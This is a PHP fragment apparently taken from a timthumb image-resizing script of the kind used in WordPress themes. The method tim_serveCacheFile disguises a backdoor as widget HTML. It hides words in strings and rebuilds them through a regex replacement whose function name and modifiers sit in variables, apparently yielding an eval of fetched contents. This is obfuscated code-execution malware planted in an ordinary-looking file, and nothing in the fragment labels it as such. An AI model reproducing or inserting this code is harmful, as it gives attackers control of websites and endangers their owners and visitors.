...
class timthumb {
	...
	protected function tim_serveCacheFile($length='') {
		...
		$mdetails="<div class='body-continent'><div class='get-inner-al(@fi'>";
		...
		$mdetails.="<!--Deregister() Default Widgets: _oabhrtupwprs:e--></div></div>";
		...
		$defult_widgets=@$pr("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6{$metaboxed}\\2t\\6\\1ents{$metaoptions}", $mdetails);
		return $output;
	}
